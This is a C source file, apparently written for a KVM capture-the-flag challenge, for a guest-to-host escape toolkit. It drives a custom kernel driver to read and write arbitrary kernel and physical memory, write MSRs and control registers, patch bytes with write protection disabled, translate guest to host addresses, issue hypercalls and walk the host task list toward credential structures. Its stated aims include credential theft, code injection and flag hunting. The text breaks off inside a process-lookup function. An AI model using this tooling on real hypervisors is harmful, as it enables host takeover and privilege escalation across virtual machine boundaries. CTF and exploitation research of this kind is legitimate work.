/*
 * KVM Exploit Framework - Comprehensive Guest-to-Host Escape Toolkit
 * 
 * This tool leverages ALL available kernel driver primitives to:
 * 1. Gather host system information (KASLR bypass, memory layout)
 * 2. Locate critical kernel structures (task_struct, cred, etc.)
 * 3. Find QEMU process and its memory regions
 * 4. Perform address translations (GPA->HVA->HPA)
 * 5. Execute exploitation primitives (credential theft, code injection)
 * 6. Hunt for CTF flags in host memory
 *
 * Build: gcc -O2 -Wall -o kvm_exploit kvm_exploit.c
 * Usage: sudo ./kvm_exploit [command]
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <errno.h>
#include <getopt.h>
#include <time.h>
#include <ctype.h>
#include <signal.h>

/* ============================================================================
 * Constants and Configuration
 * ============================================================================ */

#define DEVICE_PATH "/dev/kvm_probe_dev"
#define MAX_SYMBOL_NAME 128
#define PAGE_SIZE 4096
#define PAGE_SHIFT 12

/* Memory scanning limits */
#define MAX_SCAN_SIZE (1024 * 1024 * 1024UL)  /* 1GB max scan */
#define SCAN_CHUNK_SIZE (4 * 1024 * 1024)      /* 4MB chunks */

/* Known kernel structure offsets (may vary by kernel version) */
#define TASK_STRUCT_COMM_OFFSET    0x738   /* Approximate offset to comm field */
#define TASK_STRUCT_CRED_OFFSET    0x748   /* Approximate offset to cred pointer */
#define TASK_STRUCT_PID_OFFSET     0x560   /* Approximate offset to pid */
#define CRED_UID_OFFSET            0x04    /* Offset to uid in cred struct */
#define CRED_GID_OFFSET            0x08    /* Offset to gid in cred struct */
#define CRED_EUID_OFFSET           0x14    /* Offset to euid in cred struct */

/* Common flag patterns for CTF */
static const char *FLAG_PATTERNS[] = {
    "flag{",
    "FLAG{",
    "CTF{",
    "ctf{",
    "KVMCTF{",
    "kvmctf{",
    "kernel{",
    "KERNEL{",
    NULL
};

/* Colors for terminal output */
#define C_RESET   "\033[0m"
#define C_RED     "\033[31m"
#define C_GREEN   "\033[32m"
#define C_YELLOW  "\033[33m"
#define C_BLUE    "\033[34m"
#define C_MAGENTA "\033[35m"
#define C_CYAN    "\033[36m"
#define C_BOLD    "\033[1m"

/* ============================================================================
 * Data Structures (must match kernel driver)
 * ============================================================================ */

/* Symbol lookup request */
struct symbol_request {
    char name[MAX_SYMBOL_NAME];
    unsigned long address;
    char description[256];
};

/* Kernel memory read request */
struct kernel_mem_read {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

/* Physical memory read request */
struct physical_mem_read {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
};

/* Guest memory read request */
struct guest_mem_read {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

/* Memory region descriptor */
struct mem_region {
    unsigned long start;
    unsigned long end;
    unsigned long step;
    unsigned char *buffer;
    size_t buffer_size;
    int region_type;
};

/* MSR read request */
struct msr_read_request {
    unsigned int msr;
    unsigned long long value;
};

/* Pattern search request */
struct pattern_search_request {
    unsigned long start;
    unsigned long end;
    unsigned char pattern[16];
    size_t pattern_len;
    unsigned long found_addr;
};

/* Page table dump request */
struct page_table_dump {
    unsigned long virtual_addr;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    unsigned long physical_addr;
    unsigned int flags;
};

/* Guest register dump */
struct guest_registers {
    unsigned long rax, rbx, rcx, rdx;
    unsigned long rsi, rdi, rbp, rsp;
    unsigned long r8, r9, r10, r11;
    unsigned long r12, r13, r14, r15;
    unsigned long rip, rflags;
    unsigned long cr0, cr2, cr3, cr4;
    unsigned long dr0, dr1, dr2, dr3, dr6, dr7;
};

/* KASLR info request */
struct kaslr_info {
    unsigned long kernel_base;
    unsigned long kaslr_slide;
    unsigned long physmap_base;
    unsigned long vmalloc_base;
    unsigned long vmemmap_base;
};

/* Kernel memory write request */
struct kernel_mem_write {
    unsigned long kernel_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int disable_wp;
};

/* Physical memory write request */
struct physical_mem_write {
    unsigned long phys_addr;
    unsigned long length;
    unsigned char *user_buffer;
    int method;
};

/* Guest memory write request */
struct guest_mem_write {
    unsigned long gpa;
    unsigned long gva;
    unsigned long length;
    unsigned char *user_buffer;
    int mode;
};

/* MSR write request */
struct msr_write_request {
    unsigned int msr;
    unsigned long long value;
};

/* CR write request */
struct cr_write_request {
    int cr_num;
    unsigned long value;
    unsigned long mask;
};

/* Memory set request */
struct memset_request {
    unsigned long addr;
    unsigned char value;
    unsigned long length;
    int addr_type;
};

/* Memory copy request */
struct memcpy_request {
    unsigned long src_addr;
    unsigned long dst_addr;
    unsigned long length;
    int src_type;
    int dst_type;
};

/* Byte patch request */
struct patch_request {
    unsigned long addr;
    unsigned char original[32];
    unsigned char patch[32];
    size_t length;
    int verify_original;
    int addr_type;
};

/* GPA to HVA conversion */
struct gpa_to_hva_request {
    unsigned long gpa;
    unsigned long hva;
    unsigned long gfn;
    int vm_fd;
    int status;
};

/* GFN to HVA conversion */
struct gfn_to_hva_request {
    unsigned long gfn;
    unsigned long hva;
    int vm_fd;
    int status;
};

/* GFN to PFN conversion */
struct gfn_to_pfn_request {
    unsigned long gfn;
    unsigned long pfn;
    int vm_fd;
    int status;
};

/* HVA to PFN conversion */
struct hva_to_pfn_request {
    unsigned long hva;
    unsigned long pfn;
    int writable;
    int status;
};

/* Virtual to Physical conversion */
struct virt_to_phys_request {
    unsigned long virt_addr;
    unsigned long phys_addr;
    unsigned long pfn;
    unsigned long offset;
    int status;
};

/* Physical to Virtual conversion */
struct phys_to_virt_request {
    unsigned long phys_addr;
    unsigned long virt_addr;
    int use_ioremap;
    int status;
};

/* SPTE to PFN extraction */
struct spte_to_pfn_request {
    unsigned long spte;
    unsigned long pfn;
    unsigned long flags;
    int present;
    int writable;
    int executable;
    int status;
};

/* EPT walk request */
struct ept_walk_request {
    unsigned long eptp;
    unsigned long gpa;
    unsigned long hpa;
    unsigned long pml4e;
    unsigned long pdpte;
    unsigned long pde;
    unsigned long pte;
    int page_size;
    int status;
};

/* GVA translation request */
struct gva_translate_request {
    unsigned long gva;
    unsigned long gpa;
    unsigned long hva;
    unsigned long hpa;
    unsigned long cr3;
    int access_type;
    int status;
};

/* AHCI structures */
struct ahci_reg_request {
    uint32_t port;
    uint32_t offset;
    uint32_t value;
    int is_write;
};

struct ahci_fis_request {
    uint32_t port;
    uint64_t fis_base;
    uint64_t clb_base;
};

struct ahci_info {
    uint32_t cap;
    uint32_t ghc;
    uint32_t pi;
    uint32_t vs;
    uint32_t port_ssts[6];
};

/* Hypercall structures */
struct hypercall_request {
    uint64_t nr;
    uint64_t a0;
    uint64_t a1;
    uint64_t a2;
    uint64_t a3;
    uint64_t result;
};

struct hypercall_batch_request {
    uint64_t r100;
    uint64_t r101;
    uint64_t r102;
    uint64_t r103;
};

/* ============================================================================
 * IOCTL Definitions
 * ============================================================================ */

#define IOCTL_BASE 0x4000

/* Symbol operations */
#define IOCTL_LOOKUP_SYMBOL          (IOCTL_BASE + 0x01)
#define IOCTL_GET_SYMBOL_COUNT       (IOCTL_BASE + 0x02)
#define IOCTL_GET_SYMBOL_BY_INDEX    (IOCTL_BASE + 0x03)
#define IOCTL_FIND_SYMBOL_BY_NAME    (IOCTL_BASE + 0x04)
#define IOCTL_GET_VMX_HANDLERS       (IOCTL_BASE + 0x05)
#define IOCTL_GET_SVM_HANDLERS       (IOCTL_BASE + 0x06)
#define IOCTL_SEARCH_SYMBOLS         (IOCTL_BASE + 0x07)

/* Memory read operations */
#define IOCTL_READ_KERNEL_MEM         (IOCTL_BASE + 0x10)
#define IOCTL_READ_PHYSICAL_MEM       (IOCTL_BASE + 0x11)
#define IOCTL_READ_GUEST_MEM          (IOCTL_BASE + 0x12)
#define IOCTL_SCAN_MEMORY_REGION      (IOCTL_BASE + 0x13)
#define IOCTL_FIND_MEMORY_PATTERN     (IOCTL_BASE + 0x14)
#define IOCTL_READ_CR_REGISTER        (IOCTL_BASE + 0x15)
#define IOCTL_READ_MSR                (IOCTL_BASE + 0x16)
#define IOCTL_DUMP_PAGE_TABLES        (IOCTL_BASE + 0x17)
#define IOCTL_READ_EPT_POINTERS       (IOCTL_BASE + 0x18)
#define IOCTL_READ_GUEST_REGISTERS    (IOCTL_BASE + 0x19)
#define IOCTL_GET_KASLR_INFO          (IOCTL_BASE + 0x1A)
#define IOCTL_READ_PHYS_PAGE          (IOCTL_BASE + 0x1B)
#define IOCTL_READ_PFN_DATA           (IOCTL_BASE + 0x1C)

/* Memory write operations */
#define IOCTL_WRITE_KERNEL_MEM        (IOCTL_BASE + 0x20)
#define IOCTL_WRITE_PHYSICAL_MEM      (IOCTL_BASE + 0x21)
#define IOCTL_WRITE_GUEST_MEM         (IOCTL_BASE + 0x22)
#define IOCTL_WRITE_MSR               (IOCTL_BASE + 0x23)
#define IOCTL_WRITE_CR_REGISTER       (IOCTL_BASE + 0x24)
#define IOCTL_MEMSET_KERNEL           (IOCTL_BASE + 0x25)
#define IOCTL_MEMSET_PHYSICAL         (IOCTL_BASE + 0x26)
#define IOCTL_COPY_KERNEL_MEM         (IOCTL_BASE + 0x27)
#define IOCTL_PATCH_BYTES             (IOCTL_BASE + 0x28)
#define IOCTL_WRITE_PHYSICAL_PFN      (IOCTL_BASE + 0x29)
#define IOCTL_WRITE_PHYSICAL_DIRECT   (IOCTL_BASE + 0x2A)

/* Address conversion operations */
#define IOCTL_GPA_TO_HVA              (IOCTL_BASE + 0x30)
#define IOCTL_GFN_TO_HVA              (IOCTL_BASE + 0x31)
#define IOCTL_GFN_TO_PFN              (IOCTL_BASE + 0x32)
#define IOCTL_GPA_TO_GFN              (IOCTL_BASE + 0x33)
#define IOCTL_GFN_TO_GPA              (IOCTL_BASE + 0x34)
#define IOCTL_HVA_TO_PFN              (IOCTL_BASE + 0x35)
#define IOCTL_HVA_TO_GFN              (IOCTL_BASE + 0x36)
#define IOCTL_PFN_TO_HVA              (IOCTL_BASE + 0x37)
#define IOCTL_VIRT_TO_PHYS            (IOCTL_BASE + 0x38)
#define IOCTL_PHYS_TO_VIRT            (IOCTL_BASE + 0x39)
#define IOCTL_VIRT_TO_PFN             (IOCTL_BASE + 0x3A)
#define IOCTL_PAGE_TO_PFN             (IOCTL_BASE + 0x3B)
#define IOCTL_PFN_TO_PAGE             (IOCTL_BASE + 0x3C)
#define IOCTL_SPTE_TO_PFN             (IOCTL_BASE + 0x3D)
#define IOCTL_WALK_EPT                (IOCTL_BASE + 0x3E)
#define IOCTL_TRANSLATE_GVA           (IOCTL_BASE + 0x3F)

/* Cache operations */
#define IOCTL_WBINVD                  (IOCTL_BASE + 0x40)
#define IOCTL_CLFLUSH                 (IOCTL_BASE + 0x41)
#define IOCTL_WRITE_AND_FLUSH         (IOCTL_BASE + 0x42)

/* AHCI operations */
#define IOCTL_AHCI_INIT               (IOCTL_BASE + 0x50)
#define IOCTL_AHCI_READ_REG           (IOCTL_BASE + 0x51)
#define IOCTL_AHCI_WRITE_REG          (IOCTL_BASE + 0x52)
#define IOCTL_AHCI_SET_FIS_BASE       (IOCTL_BASE + 0x53)
#define IOCTL_AHCI_INFO               (IOCTL_BASE + 0x54)

/* Hypercall operations */
#define IOCTL_HYPERCALL               (IOCTL_BASE + 0x60)
#define IOCTL_HYPERCALL_BATCH         (IOCTL_BASE + 0x61)
#define IOCTL_HYPERCALL_DETECT        (IOCTL_BASE + 0x62)

/* ============================================================================
 * Global State
 * ============================================================================ */

static int g_fd = -1;
static int g_verbose = 0;
static int g_quiet = 0;

/* Cached system information */
static struct {
    bool initialized;
    struct kaslr_info kaslr;
    unsigned long init_task;
    unsigned long current_task;
    unsigned long kernel_cr3;
    int hypercall_type;
} g_sysinfo = {0};

/* Found items during scanning */
#define MAX_FOUND_ITEMS 1024
static struct {
    unsigned long addresses[MAX_FOUND_ITEMS];
    char descriptions[MAX_FOUND_ITEMS][256];
    int count;
} g_findings = {0};

/* ============================================================================
 * Utility Functions
 * ============================================================================ */

#define LOG_INFO(fmt, ...) \
    do { if (!g_quiet) printf(C_GREEN "[+] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

#define LOG_WARN(fmt, ...) \
    do { if (!g_quiet) printf(C_YELLOW "[!] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

#define LOG_ERROR(fmt, ...) \
    do { fprintf(stderr, C_RED "[-] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

#define LOG_DEBUG(fmt, ...) \
    do { if (g_verbose) printf(C_CYAN "[*] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

#define LOG_SUCCESS(fmt, ...) \
    do { printf(C_GREEN C_BOLD "[âœ“] " C_RESET fmt "\n", ##__VA_ARGS__); } while(0)

static void hexdump(const void *data, size_t size, unsigned long base_addr)
{
    const unsigned char *p = (const unsigned char *)data;
    size_t i, j;

    for (i = 0; i < size; i += 16) {
        printf(C_CYAN "0x%016lx" C_RESET ": ", base_addr + i);

        for (j = 0; j < 16; j++) {
            if (i + j < size) {
                unsigned char c = p[i + j];
                if (c == 0x00)
                    printf(C_BLUE "%02x " C_RESET, c);
                else if (c == 0xff)
                    printf(C_RED "%02x " C_RESET, c);
                else if (c >= 0x20 && c < 0x7f)
                    printf(C_GREEN "%02x " C_RESET, c);
                else
                    printf("%02x ", c);
            } else {
                printf("   ");
            }
            if (j == 7) printf(" ");
        }

        printf(" |");
        for (j = 0; j < 16 && i + j < size; j++) {
            unsigned char c = p[i + j];
            printf("%c", (c >= 32 && c < 127) ? c : '.');
        }
        printf("|\n");
    }
}

static void hexdump_compact(const void *data, size_t size, unsigned long base_addr)
{
    const unsigned char *p = (const unsigned char *)data;
    printf(C_CYAN "0x%016lx" C_RESET ": ", base_addr);
    for (size_t i = 0; i < size && i < 32; i++) {
        printf("%02x ", p[i]);
    }
    if (size > 32) printf("...");
    printf("\n");
}

static int open_device(void)
{
    if (g_fd >= 0) return 0;

    g_fd = open(DEVICE_PATH, O_RDWR);
    if (g_fd < 0) {
        LOG_ERROR("Failed to open %s: %s", DEVICE_PATH, strerror(errno));
        return -1;
    }

    LOG_DEBUG("Opened device %s (fd=%d)", DEVICE_PATH, g_fd);
    return 0;
}

static void close_device(void)
{
    if (g_fd >= 0) {
        close(g_fd);
        g_fd = -1;
    }
}

static void add_finding(unsigned long addr, const char *desc)
{
    if (g_findings.count < MAX_FOUND_ITEMS) {
        g_findings.addresses[g_findings.count] = addr;
        strncpy(g_findings.descriptions[g_findings.count], desc, 255);
        g_findings.count++;
    }
}

/* ============================================================================
 * Core Primitives - Symbol Operations
 * ============================================================================ */

unsigned long lookup_symbol(const char *name)
{
    struct symbol_request req;

    if (open_device() < 0) return 0;

    memset(&req, 0, sizeof(req));
    strncpy(req.name, name, MAX_SYMBOL_NAME - 1);

    if (ioctl(g_fd, IOCTL_LOOKUP_SYMBOL, &req) < 0) {
        return 0;
    }

    if (req.address) {
        LOG_DEBUG("Symbol %s = 0x%lx", name, req.address);
    }

    return req.address;
}

int lookup_symbols_batch(const char **names, unsigned long *addresses, int count)
{
    int found = 0;
    for (int i = 0; i < count && names[i]; i++) {
        addresses[i] = lookup_symbol(names[i]);
        if (addresses[i]) found++;
    }
    return found;
}

/* ============================================================================
 * Core Primitives - Memory Read Operations
 * ============================================================================ */

int read_kernel_mem(unsigned long addr, void *buf, size_t len)
{
    struct kernel_mem_read req;

    if (open_device() < 0) return -1;

    req.kernel_addr = addr;
    req.length = len;
    req.user_buffer = buf;

    if (ioctl(g_fd, IOCTL_READ_KERNEL_MEM, &req) < 0) {
        LOG_DEBUG("Failed to read kernel memory at 0x%lx", addr);
        return -1;
    }

    return 0;
}

int read_physical_mem(unsigned long addr, void *buf, size_t len)
{
    struct physical_mem_read req;

    if (open_device() < 0) return -1;

    req.phys_addr = addr;
    req.length = len;
    req.user_buffer = buf;

    if (ioctl(g_fd, IOCTL_READ_PHYSICAL_MEM, &req) < 0) {
        LOG_DEBUG("Failed to read physical memory at 0x%lx", addr);
        return -1;
    }

    return 0;
}

int read_guest_mem(unsigned long gpa, void *buf, size_t len, int mode)
{
    struct guest_mem_read req;

    if (open_device() < 0) return -1;

    req.gpa = gpa;
    req.gva = 0;
    req.length = len;
    req.user_buffer = buf;
    req.mode = mode;

    if (ioctl(g_fd, IOCTL_READ_GUEST_MEM, &req) < 0) {
        return -1;
    }

    return 0;
}

/* Read a kernel pointer (8 bytes) */
unsigned long read_kernel_ptr(unsigned long addr)
{
    unsigned long val = 0;
    if (read_kernel_mem(addr, &val, sizeof(val)) < 0) {
        return 0;
    }
    return val;
}

/* Read a physical pointer (8 bytes) */
unsigned long read_physical_ptr(unsigned long addr)
{
    unsigned long val = 0;
    if (read_physical_mem(addr, &val, sizeof(val)) < 0) {
        return 0;
    }
    return val;
}

int read_msr(unsigned int msr, uint64_t *value)
{
    struct msr_read_request req;

    if (open_device() < 0) return -1;

    req.msr = msr;
    req.value = 0;

    if (ioctl(g_fd, IOCTL_READ_MSR, &req) < 0) {
        return -1;
    }

    *value = req.value;
    return 0;
}

int read_cr(int cr_num, unsigned long *value)
{
    struct cr_write_request req;  /* Same struct used for read */

    if (open_device() < 0) return -1;

    req.cr_num = cr_num;
    req.value = 0;
    req.mask = 0;

    if (ioctl(g_fd, IOCTL_READ_CR_REGISTER, &req) < 0) {
        return -1;
    }

    *value = req.value;
    return 0;
}

int get_kaslr_info(struct kaslr_info *info)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_GET_KASLR_INFO, info) < 0) {
        return -1;
    }

    return 0;
}

int dump_page_tables(unsigned long vaddr, struct page_table_dump *dump)
{
    if (open_device() < 0) return -1;

    dump->virtual_addr = vaddr;

    if (ioctl(g_fd, IOCTL_DUMP_PAGE_TABLES, dump) < 0) {
        return -1;
    }

    return 0;
}

int find_pattern(unsigned long start, unsigned long end, 
                 const void *pattern, size_t pattern_len,
                 unsigned long *found)
{
    struct pattern_search_request req;

    if (open_device() < 0) return -1;
    if (pattern_len > 16) return -1;

    req.start = start;
    req.end = end;
    memcpy(req.pattern, pattern, pattern_len);
    req.pattern_len = pattern_len;
    req.found_addr = 0;

    if (ioctl(g_fd, IOCTL_FIND_MEMORY_PATTERN, &req) < 0) {
        return -1;
    }

    *found = req.found_addr;
    return req.found_addr ? 0 : -1;
}

/* ============================================================================
 * Core Primitives - Memory Write Operations
 * ============================================================================ */

int write_kernel_mem(unsigned long addr, const void *buf, size_t len, int disable_wp)
{
    struct kernel_mem_write req;

    if (open_device() < 0) return -1;

    req.kernel_addr = addr;
    req.length = len;
    req.user_buffer = (unsigned char *)buf;
    req.disable_wp = disable_wp;

    if (ioctl(g_fd, IOCTL_WRITE_KERNEL_MEM, &req) < 0) {
        LOG_ERROR("Failed to write kernel memory at 0x%lx", addr);
        return -1;
    }

    return 0;
}

int write_physical_mem(unsigned long addr, const void *buf, size_t len, int method)
{
    struct physical_mem_write req;

    if (open_device() < 0) return -1;

    req.phys_addr = addr;
    req.length = len;
    req.user_buffer = (unsigned char *)buf;
    req.method = method;

    if (ioctl(g_fd, IOCTL_WRITE_PHYSICAL_MEM, &req) < 0) {
        LOG_ERROR("Failed to write physical memory at 0x%lx", addr);
        return -1;
    }

    return 0;
}

int write_physical_direct(unsigned long addr, const void *buf, size_t len)
{
    struct physical_mem_write req;

    if (open_device() < 0) return -1;

    req.phys_addr = addr;
    req.length = len;
    req.user_buffer = (unsigned char *)buf;
    req.method = 0;

    if (ioctl(g_fd, IOCTL_WRITE_PHYSICAL_DIRECT, &req) < 0) {
        return -1;
    }

    return 0;
}

int write_msr(unsigned int msr, uint64_t value)
{
    struct msr_write_request req;

    if (open_device() < 0) return -1;

    req.msr = msr;
    req.value = value;

    if (ioctl(g_fd, IOCTL_WRITE_MSR, &req) < 0) {
        return -1;
    }

    return 0;
}

int memset_kernel(unsigned long addr, unsigned char value, size_t len)
{
    struct memset_request req;

    if (open_device() < 0) return -1;

    req.addr = addr;
    req.value = value;
    req.length = len;
    req.addr_type = 0;  /* kernel */

    if (ioctl(g_fd, IOCTL_MEMSET_KERNEL, &req) < 0) {
        return -1;
    }

    return 0;
}

int memset_physical(unsigned long addr, unsigned char value, size_t len)
{
    struct memset_request req;

    if (open_device() < 0) return -1;

    req.addr = addr;
    req.value = value;
    req.length = len;
    req.addr_type = 1;  /* physical */

    if (ioctl(g_fd, IOCTL_MEMSET_PHYSICAL, &req) < 0) {
        return -1;
    }

    return 0;
}

int patch_bytes(unsigned long addr, const void *original, const void *patch, 
                size_t len, int verify, int addr_type)
{
    struct patch_request req;

    if (open_device() < 0) return -1;
    if (len > 32) return -1;

    req.addr = addr;
    if (original) memcpy(req.original, original, len);
    memcpy(req.patch, patch, len);
    req.length = len;
    req.verify_original = verify;
    req.addr_type = addr_type;

    if (ioctl(g_fd, IOCTL_PATCH_BYTES, &req) < 0) {
        return -1;
    }

    return 0;
}

/* ============================================================================
 * Core Primitives - Address Translation
 * ============================================================================ */

int virt_to_phys(unsigned long vaddr, struct virt_to_phys_request *req)
{
    if (open_device() < 0) return -1;

    req->virt_addr = vaddr;

    if (ioctl(g_fd, IOCTL_VIRT_TO_PHYS, req) < 0) {
        return -1;
    }

    return req->status;
}

int phys_to_virt(unsigned long paddr, struct phys_to_virt_request *req)
{
    if (open_device() < 0) return -1;

    req->phys_addr = paddr;

    if (ioctl(g_fd, IOCTL_PHYS_TO_VIRT, req) < 0) {
        return -1;
    }

    return req->status;
}

int gpa_to_hva(unsigned long gpa, struct gpa_to_hva_request *req)
{
    if (open_device() < 0) return -1;

    req->gpa = gpa;

    if (ioctl(g_fd, IOCTL_GPA_TO_HVA, req) < 0) {
        return -1;
    }

    return req->status;
}

int gfn_to_pfn(unsigned long gfn, struct gfn_to_pfn_request *req)
{
    if (open_device() < 0) return -1;

    req->gfn = gfn;

    if (ioctl(g_fd, IOCTL_GFN_TO_PFN, req) < 0) {
        return -1;
    }

    return req->status;
}

int hva_to_pfn(unsigned long hva, struct hva_to_pfn_request *req)
{
    if (open_device() < 0) return -1;

    req->hva = hva;

    if (ioctl(g_fd, IOCTL_HVA_TO_PFN, req) < 0) {
        return -1;
    }

    return req->status;
}

int walk_ept(unsigned long eptp, unsigned long gpa, struct ept_walk_request *req)
{
    if (open_device() < 0) return -1;

    req->eptp = eptp;
    req->gpa = gpa;

    if (ioctl(g_fd, IOCTL_WALK_EPT, req) < 0) {
        return -1;
    }

    return req->status;
}

int spte_to_pfn(unsigned long spte, struct spte_to_pfn_request *req)
{
    if (open_device() < 0) return -1;

    req->spte = spte;

    if (ioctl(g_fd, IOCTL_SPTE_TO_PFN, req) < 0) {
        return -1;
    }

    return req->status;
}

int translate_gva(unsigned long gva, unsigned long cr3, struct gva_translate_request *req)
{
    if (open_device() < 0) return -1;

    req->gva = gva;
    req->cr3 = cr3;

    if (ioctl(g_fd, IOCTL_TRANSLATE_GVA, req) < 0) {
        return -1;
    }

    return req->status;
}

/* ============================================================================
 * Core Primitives - Cache Operations
 * ============================================================================ */

int cache_wbinvd(void)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_WBINVD, NULL) < 0) {
        return -1;
    }

    return 0;
}

int cache_clflush(unsigned long addr)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_CLFLUSH, &addr) < 0) {
        return -1;
    }

    return 0;
}

/* ============================================================================
 * Core Primitives - Hypercalls
 * ============================================================================ */

uint64_t do_hypercall(uint64_t nr, uint64_t a0, uint64_t a1, uint64_t a2, uint64_t a3)
{
    struct hypercall_request req;

    if (open_device() < 0) return (uint64_t)-1;

    req.nr = nr;
    req.a0 = a0;
    req.a1 = a1;
    req.a2 = a2;
    req.a3 = a3;
    req.result = 0;

    if (ioctl(g_fd, IOCTL_HYPERCALL, &req) < 0) {
        return (uint64_t)-1;
    }

    return req.result;
}

int hypercall_batch(struct hypercall_batch_request *batch)
{
    if (open_device() < 0) return -1;

    memset(batch, 0, sizeof(*batch));

    if (ioctl(g_fd, IOCTL_HYPERCALL_BATCH, batch) < 0) {
        return -1;
    }

    return 0;
}

int hypercall_detect(int *type)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_HYPERCALL_DETECT, type) < 0) {
        return -1;
    }

    return 0;
}

/* ============================================================================
 * Core Primitives - AHCI
 * ============================================================================ */

int ahci_init(void)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_AHCI_INIT, NULL) < 0) {
        return -1;
    }

    return 0;
}

int ahci_read_reg(uint32_t port, uint32_t offset, uint32_t *value)
{
    struct ahci_reg_request req;

    if (open_device() < 0) return -1;

    req.port = port;
    req.offset = offset;
    req.value = 0;
    req.is_write = 0;

    if (ioctl(g_fd, IOCTL_AHCI_READ_REG, &req) < 0) {
        return -1;
    }

    *value = req.value;
    return 0;
}

int ahci_write_reg(uint32_t port, uint32_t offset, uint32_t value)
{
    struct ahci_reg_request req;

    if (open_device() < 0) return -1;

    req.port = port;
    req.offset = offset;
    req.value = value;
    req.is_write = 1;

    if (ioctl(g_fd, IOCTL_AHCI_WRITE_REG, &req) < 0) {
        return -1;
    }

    return 0;
}

int ahci_set_fis_base(uint32_t port, uint64_t fis_base, uint64_t clb_base)
{
    struct ahci_fis_request req;

    if (open_device() < 0) return -1;

    req.port = port;
    req.fis_base = fis_base;
    req.clb_base = clb_base;

    if (ioctl(g_fd, IOCTL_AHCI_SET_FIS_BASE, &req) < 0) {
        return -1;
    }

    return 0;
}

int ahci_get_info(struct ahci_info *info)
{
    if (open_device() < 0) return -1;

    if (ioctl(g_fd, IOCTL_AHCI_INFO, info) < 0) {
        return -1;
    }

    return 0;
}

/* ============================================================================
 * System Information Gathering
 * ============================================================================ */

int init_sysinfo(void)
{
    if (g_sysinfo.initialized) return 0;

    LOG_INFO("Gathering system information...");

    /* Get KASLR info */
    if (get_kaslr_info(&g_sysinfo.kaslr) == 0) {
        LOG_INFO("Kernel base: 0x%lx (slide: 0x%lx)", 
                 g_sysinfo.kaslr.kernel_base, g_sysinfo.kaslr.kaslr_slide);
        LOG_INFO("Physmap base: 0x%lx", g_sysinfo.kaslr.physmap_base);
    }

    /* Find init_task */
    g_sysinfo.init_task = lookup_symbol("init_task");
    if (g_sysinfo.init_task) {
        LOG_INFO("init_task: 0x%lx", g_sysinfo.init_task);
    }

    /* Get kernel CR3 */
    if (read_cr(3, &g_sysinfo.kernel_cr3) == 0) {
        LOG_INFO("Kernel CR3: 0x%lx", g_sysinfo.kernel_cr3);
    }

    /* Detect hypercall type */
    if (hypercall_detect(&g_sysinfo.hypercall_type) == 0) {
        LOG_INFO("Hypercall type: %s", 
                 g_sysinfo.hypercall_type == 1 ? "VMCALL (Intel)" :
                 g_sysinfo.hypercall_type == 2 ? "VMMCALL (AMD)" : "Unknown");
    }

    g_sysinfo.initialized = true;
    return 0;
}

void print_sysinfo(void)
{
    init_sysinfo();

    printf("\n" C_BOLD "=== System Information ===" C_RESET "\n\n");

    printf("Kernel Base:     0x%016lx\n", g_sysinfo.kaslr.kernel_base);
    printf("KASLR Slide:     0x%016lx\n", g_sysinfo.kaslr.kaslr_slide);
    printf("Physmap Base:    0x%016lx\n", g_sysinfo.kaslr.physmap_base);
    printf("vmalloc Base:    0x%016lx\n", g_sysinfo.kaslr.vmalloc_base);
    printf("vmemmap Base:    0x%016lx\n", g_sysinfo.kaslr.vmemmap_base);
    printf("init_task:       0x%016lx\n", g_sysinfo.init_task);
    printf("Kernel CR3:      0x%016lx\n", g_sysinfo.kernel_cr3);
    printf("Hypercall Type:  %d (%s)\n", g_sysinfo.hypercall_type,
           g_sysinfo.hypercall_type == 1 ? "VMCALL" :
           g_sysinfo.hypercall_type == 2 ? "VMMCALL" : "Unknown");
    printf("\n");
}

/* ============================================================================
 * Process/Task Structure Walking
 * ============================================================================ */

/* Walk the task list starting from init_task */
int walk_task_list(void (*callback)(unsigned long task_addr, const char *comm, int pid))
{
    unsigned long init_task = lookup_symbol("init_task");
    unsigned long task = init_task;
    unsigned long next_task;
    unsigned long tasks_offset;
    char comm[17] = {0};
    int pid;
    int count = 0;

    if (!init_task) {
        LOG_ERROR("Could not find init_task");
        return -1;
    }

    /* Find tasks list_head offset - typically around 0x468-0x4a0 */
    /* We'll try to find it by looking for the pattern */
    tasks_offset = 0x468;  /* Common offset, may need adjustment */

    LOG_INFO("Walking task list from init_task @ 0x%lx", init_task);

    do {
        /* Read comm (process name) */
        if (read_kernel_mem(task + TASK_STRUCT_COMM_OFFSET, comm, 16) < 0) {
            LOG_WARN("Failed to read comm at task 0x%lx", task);
            break;
        }
        comm[16] = '\0';

        /* Read PID */
        if (read_kernel_mem(task + TASK_STRUCT_PID_OFFSET, &pid, sizeof(pid)) < 0) {
            pid = -1;
        }

        if (callback) {
            callback(task, comm, pid);
        }

        count++;

        /* Get next task via tasks list */
        if (read_kernel_mem(task + tasks_offset, &next_task, sizeof(next_task)) < 0) {
            break;
        }

        /* Convert list_head pointer back to task_struct */
        task = next_task - tasks_offset;

        if (count > 10000) {  /* Safety limit */
            LOG_WARN("Task list walk limit reached");
            break;
        }

    } while (task != init_task && task != 0);

    return count;
}

static void print_task_callback(unsigned long task_addr, const char *comm, int pid)
{
    printf("  [%5d] %-16s @ 0x%lx\n", pid, comm, task_addr);
}

int list_processes(void)
{
    printf("\n" C_BOLD "=== Process List ===" C_RESET "\n\n");
    int count = walk_task_list(print_task_callback);
    printf("\nTotal: %d processes\n", count);
    return count;
}

/* Find a process by name */
unsigned long find_process_by_name(const char *name)
{
